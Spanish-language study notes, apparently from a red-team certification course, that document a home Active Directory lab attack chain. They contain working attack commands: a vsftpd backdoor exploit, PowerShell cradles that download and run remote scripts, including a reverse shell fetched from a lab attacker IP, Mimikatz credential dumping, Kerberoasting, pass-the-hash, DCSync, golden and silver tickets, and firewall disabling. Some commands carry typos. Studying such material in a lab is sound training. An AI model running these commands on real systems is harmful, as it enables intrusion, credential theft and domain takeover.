<h2 id="whity">1.5 Explotación de tecnologías en Red Teaming</h2>

Aquí se comienza a hablar del OWASP TOP 10 Web Vulnerabilities que debemos conocer, también encontraremos varios escenarios donde necesitamos explotar de forma manual Webs (Encadenamiento de vulnerabilidades), y la identificación de objetivos dentro de los ambientes específicamente la identificación de tecnologías web.

Como atacante debemos de tener nociones sobre las tecnologías web (Ejemplo encontramos una web con WordPress o HTML5, entonces encontramos una versión, o agujero que nos permita una vulnerabilidad).

<h2 id="whity">1.5.2 Network Technology</h2>

Entender los dispositivos de red como routers, switches y servers, computadoras y los protocolos de red usando en empresa. 

- Mapear los usuarios con sus sistemas, la arquitectura interna de red debe ser clara antes de atacar.
- La búsqueda de puertos abiertos TCP/UDP que permitan algún acceso remoto, o vulnerabilidades asociadas para nuestra primera enumeración.
- Quizás algún software unstable/ultima versión accesible a través de la web o red tenga una mayor chance de contener vulnerabilidades.

<h2 id="whity">1.5.3 Cloud Technology</h2>

Las organizaciones están haciendo uso de las tecnologías en la nube, ya que son rápidas y suelen ser siempre la primera opción de las organizaciones, servicios en la nube como Amazon Web Services AWS, Microsoft Azure y Google Cloud Platform GPC son desplegados por habilidosos administradores/.

- Cualquier error/mala configuracion por parte de los administradores deja una gran puerta abierta que invita a los agentes de amenaza, por ejemplo Indentity and Access Management (IAM) de empleados.
- Suele ser la puerta a las redes internas.

<h2 id="whity">1.5.4 Physical Red Teaming</h2>

En lugar de depender de enfoques basados en tecnicas, un Red Team desarrolla vectores unicos de ataque en situaciones que requiren intervencion manual y procedimientos automatizados. Los Red Team son entrenados para eludir deteciones de uno o de los siguientes dispositivos de seguridad.

1. CCTVs (Circuitos Cerrados de camaras de Televison)
2. Keypad entry locks
3. Wireless intercoms/video intercoms
4. Motion/sensor detects
5. Sigle or double deadbolts
6. Door and window locks
7. Steel security doors
8. Remote entry gates

Un ejemplo muy de película es que el Red Teamer va a dejar memorias USB en el parqueadero de los empleados, el exploit es el eslabón mas débil que lo conecte a la computadora de la organización.

<h2 id="whity">1.5.5 Wireless Attacks</h2>

El masivo crecimiento de ataques a través de redes wifi publicas, o el compromiso de redes corporativas abiertas conectadas a las redes internas tienen una gran falla de seguridad.

Algunas de las vulnerabilidades comunes de red son:

1. Credenciales por defecto de SSIDS y contraseñas
2. Tener versiones de WEP o WPA antiguas
3. WPA2 Krack Vulnerability
4. Puntos de acceso falsos, Evil Twins, y Man in the Middle Attacks
5. Packet Sniffing
6. Mac Spoffing

<h2 class="green">**Red Team Lab Setup**</h2>

Aquí se aprende a configurar un external red team lab, incluyendo las herramientas necesarias y configuraciones para simular real-words external attacks.

Por si acaso: configuración de arch para iniciar qemu:

systemctl start --now libvirtd
virsh net-start default
virsh net-list --all

<h2 class="green">External Red Team Lab Setup</h2>

Primero comenzaremos con el esquema del laboratorio:

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 26.png" alt="under" oncontextmenu="return false;">
</div>

Tenemos un servicio web expuesto y una red interna controlada por un Active Directory

Se debe descargar la maquina Metasploitable 2 de Offsec para actuar de web server, entrar como root y configurar lo siguiente:

```bash
nano /etc/network/interfaces

#external
auto eth0
iface eth0 inet static
address 192.168.50.3
netmask 255.255.255.0
gateway 192.168.50.1

#internal
auto eth1
iface eth1 inet static
address 10.10.10.5
netmask 255.255.255.0
gateway 10.10.10.1

/etc/init.d/networking restart
```

<h2 class="green">Internal Red Team Lab Setup</h2>

Descargamos Windows10, Windows server 2012 y Windows server 2016.

Para la configuración del Active Directory se usara el windows server 2016 con las credenciales (Administrador:Password1).

Para la configuración del Employee Workstation se utiliza un Windows 10 con las credenciales (ntriana:triana@1).

Para la configuración del Application Server se utiliza un Windows Server 2012 con las credenciales (john:john@143.com).

Para el usuario Admin:superpobx1*

Para el usuario neltriana:triana@1

Para el usuario adminitrator:Password1

Para el usuario app-svc:Password2

- Un nombre de dominio crtacorp.local
- Directory Services Restore Mode (superp4ssw0rd123!#)

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 27.png" alt="under" oncontextmenu="return false;">
</div>

Para listar la información de los usuarios existentes dentro del dominio podemos usar **net user /domain**

<h2 class="green">**Red Team en ambientes externos**</h2>

<h2 class="amarillo">External Red Team Operations - Part 1</h2>

Aquí comenzamos con la fase del agente de amenaza en todo su proceso para comprometer el servicio web, explotar su vulnerabilidad y lograr comprometer la maquina.

<h2 class="amarillo">Cyber Kill Chain</h2>

Representamos todo el proceso TTP del agente de amenaza.

- Reconocimiento: todo lo relacionado con las tecnologías, servicios, todo lo que pueda ser de interés.
- Escaneo y Enumeración: una vez la identificación se comienza el reconocimiento (versiones).
- Ganar acceso: las vulnerabilidades descubiertas en la face anterior cobran importancia aquí para ganar acceso inicial tras la explotación y ejecución de un payload.
- Post explotación: acceso a usuarios privilegiados y alcances.
- Mantener persistencia: el agente de amenaza no quiere perder el acceso, debe intentar de dejar algún tipo de backdoor para entrar cuando quiera.
- Eliminar huellas y rastros: remover todas las evidencia que podamos dejar en la organization, esto borrando todas nuestra huellas.

<h2 class="amarillo">Externally exposed service exploitation</h2>

Es explotar de los servicios web que pueden estar mas vulnerables debidos a malas configuraciones, o versiones muy antiguas. El agente de amenaza hace una conexión activa con el servidor expuesto para identificar estos loopholes, y trata de juntar la mayor cantidad de información para que tenga sentido (la mapea) logrando identificar el vector de ataque debido a cierta tecnología y los riegos que supe poder explotar cierta vulnerabilidad que pueda tener asociada.

- ssl
- rpd
- vnc

Por mencionar algunos de los mas explotados.

<h2 class="amarillo">Information Gathering</h2>

Consiste esta face de la recopilación del objetivo (Sistema operativo, version del sistema, kernel, etc).

- **RECONOCIMIENTO PASIVO**: Suele ser en su mayoría información publica. NO ES CONTACTO DIRECTO CON EL TARGET.
- **RECONOCIMIENTO ACTIVO**: Aquí se establece una conexión con el TARGET para obtener información relevante.

<h2 class="amarillo">Scanning & Enumeration</h2>

Desde el descubrimiento de hosts, TCP port Scanning (TCP Full Scan, TCP Syn Scan, TCP ACK Scan, TCP Fin/Rst/Psh Scan), identificación de la servicio, OS detection, UDP Port Scanning (CAMARAS DE SEGURIDAD).

<h2 class="amarillo">Host Discovery</h2>

Recordar que existe el descubrimiento de host a nivel de ARP y ICMP.

Una herramienta FIRE según el formador es NetDiscover a nivel de ARP.

```bash
netdiscover -i ens33 -r 192.168.50.0/24
```

Otra herramienta NMAP, claro no puede faltar. Significa Network Mapper y envía paquetes crudos IP para determinar si el host esta disponible en la red, servicios (nombre y servicio), sistemas operativos, que tipo de filtrado de paquetes hay y inclusive que Firewall esta en uso, etc.

Pero a nivel de Ping se utiliza NMAP con el parámetro -sn

```bash
nmap -sn 192.168.50.0/24
```

De estas formas podremos descubrir que existe la dirección IP 192.168.50.3.

<h2 class="amarillo">Vulnerability Assessment</h2>

Es la forma sistemática de revisar los riesgos de seguridad en un sistema de información. Evalúa si el sistema es susceptible a cualquier conocida vulnerabilidad, asigna valores de severidad a aquellas vulnerabilidades encontradas y recomienda su mitigación en caso de necesitarse.

Vuln Identification → Analysis → Risk Assessment → Mitigación.

Este proceso lo hace el Red Teamer con las siguiente herramientas:

- Nessus
- Acunetix
- Qualys Vulnerability Management
- Netsparker
- Metasploit
- Amazon Inspector (SOLO para aplicaciones desplegadas en AWS)
- Nikto para el entendimiento de escanear la vulnerabilidad, aplicaciones web o Nmap.

<h2 class="amarillo">External Red Team Operations - Part 2</h2>

<h2 class="amarillo">Exploitation A - Web Based</h2>

Una vez las vulnerabilidades/misconfiguraciones han sido identificadas ya podremos ir a la explotación.

- El servidor que hostea el servicio web es el webserver y generalmente esta en el puerto 80, en algunos casos el servicio puede estar configurado para operar en otros puertos diferentes al defecto, siendo medidas de seguridad.
- El cliente mediante un navegador web, se conecta al puerto y se comienza la comunicación o transferencia de archivos entre ambos.
- El servidor responde con HTML o JS.

Siempre vamos a basarnos en el modelo OSI el cual tiene 7 capas, siempre enfrentaremos maquinas a nivel de capa 7 en el modelo OSI y la 7 Con los certificados SSL.

Suele ser errores por parte de los desarrolladores, versiones de software, CMS desactualizados, information leakage en la web.

Tendremos para este laboratorio:

- Cross site scripting
- SQL Injection
- Code Injection Vulnerability
- File Inclusion
- Brute Force website parameters/fields
- File upload vulnerability etc

```bash
nc 192.168.50.3 80
OPTIONS http://192.168.50.3/dav HTTP/1.0
host:192.168.50.3
```

```bash
msfconsole
search vsftpd
use /exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 192.168.50.3
set verbose true
run

whoami
root
```

Lo siguiente es **ganar persistencia**.

<h2 class="amarillo">Network Pivoting</h2>

<h2 class="amarillo">Entendiendo el Network Pivoting</h2>

Es una técnica empleada donde hay mas de una red involucrada.

- rpivot
- Pivotsuit
- mCat

Las credenciales encontradas en el /etc/passwd fueron msfadmin:msfadmin

PORTFORWARDING TECHNIQUE 

ssh -D 8090 creara un socket en nuestra maquina que establecerá una conexión en nuestro puerto 8090 y actuara como puerta de enlace (gateway), por tanto, todo input enviado a la 8090 viajara al ssh.

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 28.png" alt="under" oncontextmenu="return false;">
</div>

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.50.3 -> Version muy antigua de ssh
```

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 29.png" alt="under" oncontextmenu="return false;">
</div>

Ahora lo que sigue es modificar el archivo /etc/proxychains.conf

```bash
socks4 127.0.0.1 8090
```

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 30.png" alt="under" oncontextmenu="return false;">
</div>

# **Red Team en ambientes internos**

## Introducción

Aquí se hace una enumeración inicial de dispositivos presentes en la red interna (En este caso nos enfocaremos en Active Directory)

**Escanear puertos TCP desde Powershell**

```powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is OPEN"} 2>$null
1..20 | % { $a = $_; write-host "------"; write-host "10.0.0.$a"; 22,53,80,445 | % { echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a", $_)) "Port $_ is OPEN"} 2>$null}
```

Powershell es muy utilizado para lograr Lateral Movement.

Para interactuar con la extensiones de powershell

```powershell
Import-Module modulo.ps1 .psm1 .psd1
.\Scriptchetado.ps1

#Descargar y ejecutar
iex(iwr'http://192.168.50.2/file.ps1')

$down = [System.NET.WebRequest]::Create("http://192.168.50.2/file.ps1")
$read = $down.GetResponse()
IEX([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()

$file = New-Object -ComObject Msxml2.XMLHTTP;$file.open('GET', 'http://192.168.50.2/file.ps1', $false);$file.send();iex $file,responseText

iex(New-Object Net.WebClient).DownloadString('http://192.168.50.2/reverse.ps1')

$ie = New-Object -ComObject InternetExplorer.Application;$ie.visible=$false;$ie.navigate('http://192,168.50.2/file.ps1');sleep 5;$response = $ie.Document.body.innerHTML;$ie.quit();iex $response

#Dominios
Get-NetDomain
Get-NetDomain -Domain crtacorp.local
Get-NetDomainController -Domain crtacorp.local Get-DomainSID
net user /domain
net user
```

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 31.png" alt="under" oncontextmenu="return false;">
</div>

```powershell
powershell -ep bypass #execution policy bypass
.\PowerView_dev.ps1
Get-NetUser
Get-NetUser | Select-Object givenname
#Traer dominio actual
Get-Domain -Verbose
Get-DomainController
Get-DomainSID -Verbose
Get-DomainSID -Domain labs.corp -Verbose
#Traer una lista de usuarios en el dominio actual
Get-NetUser -UserName sapo
#Traer una lista de computadores en el dominio actual
Get-NetComputer -Verbose
Get-NetComputer -FullData
Get-NetComputer -OperatingSystem "Windows Server 2016 Standar"
Get-NetComputer -Verbose | Select-Object dnshostname
#Traer todos los grupos del dominio
Get-NetGroup
Get-NetGroup -FullData
Get-NetGroup -Domain crtacorp.local
#Enumerar privilegios de domain group members y local administrators
Get-NetGroupMember -GroupName "Domain Admins" -verbose
Get-NetLocalGroup -ComputerName DC-01 -ListGroups
#Enumerar ACL
Get-ObjectAcl -SamAccountName <domain-user> -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs
#Enumearcion de dominos de confianza
Get-NetDomianTrust -Domain crtacorp.local
#Enumeraceion de todos los dominos en un Forest
Get-NetForestDomain -Verbose
Get-NetForest -Verbose

#Local domain access
Find-LocalAdminAccess -Verbose

```

There are various vulnerabilities that can be abused on Windows/Linux environment :
• Abuse Elevation Control Mechanism [ T1548 ]
• Access Token Manipulation [T1134 ]
• Boot or Logon Auto-start Execution [T1547 ]
• Boot or Logon Initialization Scripts [T1037 ]
• Create or Modify System Process [T1543 ]
• Event Triggered Execution [T1546 ]
• Exploitation for Privilege Escalation [T1068 ]
• Process Injection [T1055 ]
• Scheduled Task/Job [T1053 ]
• Valid Accounts [T1078 ]

## Local Privilege Escalation

PowerUP de powershell mafia se puedeu utilizar para escalar privilegios localmente en windows

```powershell
..\PowerUP.ps1
Invoke-AllChecks -Verbose
#Servicios que pueden ser configurados
Get-ModifiableService -Verbose
#Unquoted service path
Get-ServiceUnquoted -Verbose

#video
net localgroup administrators

#SNMPTRAP ABUSE
sc.exe qc snmptrap
sc.exe config snmptrap binpath="net localgroup administrators crtacorp.local\employee /add"
Restart-Service snmptrap -Verbose

```

## Credential Dumping

Con los privilegios suficientes podemos hacer Credential Dumping para los usuarios admin logueados, cuantas de servicio generalmente tienen privilegios de administrador (Kerborasting) mediante **Invoke-UserHunter**

## KERBEROASTING

Kerberoasting es basicamente romper un TGS de forma online para obtener credenciales en texto plano de los servicios.

- Enviamos todos los detalles al DC para tener un TGT valido, luego lo usamos para tener un TGS (para autorizarnos) a un servico especifico.
- Obteniendo el TGS (encriptado con el hash del SERVICE ACCOUNT), se puede exportar y hacer bruteforce para tener la contrasena.
- Por lo cual podemos tener la contrasena en texto plano, ya que no se suele cambiar las credenciales de los NON-MACHINE service account.

```powershell
#Encontrar cuentas de usuarios usadas como service accounts
Get-NetUser -SPN
#Pedit el TGS
Request-SPNTicket
#Revisar ticket en memoria
klist
#Exportar el ticket con Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
#Crackear la contransena usando tgsrepcrack.py
python.exe .\tgsrepcrack.py .\passwords.txt '.\Ticket.kirbi'

#video
#Importa mimikatz
..\Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds -Verbose -> ser Administrador
#Se obtiene un hash NTLM y un password

#PASS THE HASH ATTACK
#Se hace con el NTLM
Invoke-Mimikatz -Command '"sekurlsa::pth /user:app-svc /domain:cyberwarfare.corp /rc4:<ntlm-hash> /run:powershell.exe"'

#Kerberoasting
setspn -T crtacorp.local -Q */*
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""
kerberos::list /export
./tgsrepcrack.py wordlist.txt <.kirbi>

#Find-WMILocalAdminAccess.ps1 envia peticiones a las maquinas con las que tenga comunicacion y valida si tenemos privilegios de administrador en estas maquina
..\Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess -Verbose

#video
#enumerar SPN de la maquina
setspn -T domain.corp -Q */*

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/domain.corp"
#TGS Esta ahora en memoria
klist

#con mimikatz exportarlo
Invoke-Mimikatz -Command '"kerberos::list /export"'

#romperlo
python tgsrepcrack.py 10k-worst-pass.txt tgs.kirbi
```
<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 32.png" alt="under" oncontextmenu="return false;">
</div>

## Lateral Movement

La idea es moverse entre equipos/servers

- PowerShell Remoting
- Windows Management Instrumentation WMI
- Invoke-Mimikatz.ps1

Se recomienda no dejar huellas ni rastros.

### Powershell Remoting

Utiliza el protocolo de WINRM y corre por defecto en el puerto TCP 5985 HTTP y 5986 HTTPS, y esta habilitado por defecto en Windows server 2012

- Invoke-Command, New-PSSession, Enter-PSSession

Configuración es facil “Enable-PSRemoting -SkipNetworkProfileCheck -Verbose -Force” como administrador.

```powershell
$session = New-PSSession -ComputerName Windows-Server
Invoke-Command -Session $session -ScriptBlock {whoami;hostname}
Enter-PSSession -Session $session -Verbose
```

### Mimikatz PowerShell Script

Se utiliza para dumpeaer credenciales, tickets de Kerberos en memoria. Se ejecuta con privilegios administrativos para hacer dumping.

```powershell
Invoke-Mimikatz -DumpCreds -Verbose
Invoke-Mimikatz -DumpCreds -ComputerName @("comp1","comp2")

#Pass the hash mas famoso
Invoke-Mimikatz -Command "sekurlsa::pth /user:Administrator /domain:cyberwarfare.corp /rc4:ntlm /run/powershell.exe"

#video
Invoke-Mimikatz -ComputerName app-server -Verbose

#ver a que pertenece un usuario
net user app-svc /domain -> es domain admin

#Revisar acceso local al Domain Controller
..\PowerView_dev.ps1
Get-NetDomainController -Verbose
Invoke-CheckLocalAdminAccess -ComputerName DC-01.crtacorp.local -Verbose

```

Unconstraint Delegation

Cuando eso esta habilitado, el DC colocal el tgt del usuario en el tgs, Cuando el usuario presenta el tgs al servidor con el unconstraint delegation, el tgt extraido  y el tgs se guarda en memoria.

El APT puede exportarlo el TGT para acceder a otros recursos, la idea es entonces el TGT del Domain Admin.

```powershell
#Computadores que tiene unconstraint delegation habilitado
Get-NetComputer -unconstrained -verbose
```

ABUSE STEPS:

- Ingenieria social para conectarse al servidor o host infectado
- Extraer el Domain Admin TGT `Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
- Re utilizar e tikcer para hacer otras operaciones como Domain Admin `Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'`
- DCSYNC Attack `Invoke-Mimikatz -Command '"lsadump::dsync /user:cyberwarfare\krbtgt"'`

Some of the data exfiltration techniques are mentioned below :
• Automated Exfiltration [T1020 ]
• Exfiltration Over Alternative Protocol [T1048 ]
• Exfiltration Over Physical Medium [T1052 ]
• Transfer Data to Cloud Account [T1537 ]

Golden Ticket Attack

Los golden tickets son firmados y encriptados por la hash de la cuenta krbtgt. Para impersonificar a otro usuario con cualquier privilegio.

Requerimientos:

- Domain SID
- Krbtgt hash
- Domain Name
- SIDS in cross forest attacks

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 33.png" alt="under" oncontextmenu="return false;">
</div>

```powershell
#Extraer krbtgt hash
Invoke-Mimikatz -Command '"lsadump::dsync /user:cyberwarfare\krbtgt"'

#Domain SID
whoami /all

amsi.fail

#Adversary Forge Golden Ticket en un domain
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-5-21-XXXXX-YYYYY-xxxxx /krbtgt:xxxxxxxxxxxxxxx /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

<div style="text-align: center;">
  <img src="/assets/images/CRTA/image 34.png" alt="under" oncontextmenu="return false;">
</div>

SILVER TICKET ATTACK

Este ticket es firmado y encriptado con el target service account hash

Representa un TGS para autorizacion

REQUERIMIENTOS:

- Domain SID
- Service Account / Machine account hash
- Domain Name
- SIDS in cross forest attacks

DSYNC ATTACK

Para extraer el domain user account/service/machine credentials sin ejecucion de codigo en el domain controller el apt usa DCSYNC attack.

Se requiere un conjunto de privilegios para poder obtener el hash:

- Get-ReplicationChanges
- Get-ReplicationChangesAll
- Get-ReplicationChanges-in-a-filtered-set
- `Invoke-Mimikatz -Command '"lsadump:dsync /user:cyberwarfare\krbtgt"'`
- `Invoke-Mimikatz -Command '"lsadump::dsync /user:cyberwarfare\dc-01$"'`

```powershell
#Adversaries create a silver ticket for HOST service which allows them to schedule a malicious task on the target :
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:cyberwarfare.corp /sid:S-1-
5-21-xxxxxx-yyyy-zzzzz /target:exterprise-dc.cyberwarfare.corp /service:HOST /rc4:xxxxx /id:500
/groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

#Schedule and execute a task on Remote Server 
schtasks /create /S enterprise-dc.cyberwarfare.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN “lateral" /TR
"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.1:8000/InvokePowerShellTcp.ps1''')'"

schtasks /Run /S enterprise-dc.cyberwarfare.corp /TN "STCheck"
```


